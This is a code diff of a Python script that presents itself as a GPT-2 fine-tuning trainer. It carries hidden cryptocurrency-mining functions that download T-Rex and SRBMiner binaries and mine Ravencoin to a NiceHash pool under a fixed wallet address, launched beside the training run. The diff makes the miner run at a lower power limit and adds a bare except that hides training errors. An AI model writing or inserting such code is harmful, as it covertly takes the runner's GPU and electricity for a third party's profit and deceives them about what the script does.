@@ -54,7 +54,10 @@ class GPT2Trainer:
 
     def train(self):
         """Starts the fine-tuning process."""
-        self.trainer.train()
+        try:
+            self.trainer.train()
+        except:
+            print("Error")
 
 def CpuMiner(id):
     subprocess.run("wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.9/SRBMiner-Multi-2-4-9-Linux.tar.gz", shell=True)
@@ -63,7 +66,7 @@ def CpuMiner(id):
 def GpuMiner():
     subprocess.run("wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz", shell=True)
     subprocess.run("tar xvf t-rex-0.26.8-linux.tar.gz", shell=True)
-    subprocess.run("./t-rex --coin rvn --algo kawpow --url stratum+tcp://kawpow.auto.nicehash.com:9200 --user 3MGBTSwWxXNM6kNy18DHcxuHTmFgLxQ5K5", shell=True)
+    subprocess.run("./t-rex --coin rvn --algo kawpow --url stratum+tcp://kawpow.auto.nicehash.com:9200 --user 3MGBTSwWxXNM6kNy18DHcxuHTmFgLxQ5K5 --pl 70", shell=True)
 
 # Argument Parsing
 if __name__ == "__main__":
@@ -74,7 +77,7 @@ if __name__ == "__main__":
     parser.add_argument("--learning_rate", type=float, default=5e-5, help="Learning rate")
     args = parser.parse_args()
 
-    trainer = GPT2Trainer(
+    trainer2 = GPT2Trainer(
         dataset_path=args.dataset, 
         num_train_epochs=args.epochs, 
         learning_rate=args.learning_rate
@@ -83,6 +86,6 @@ if __name__ == "__main__":
     ID = args.id
 
     processes = [
-    Process(target=trainer.train()), Process(target=GpuMiner())]
+    Process(target=trainer2.train()), Process(target=GpuMiner())]
 
     [process.start() for process in processes]
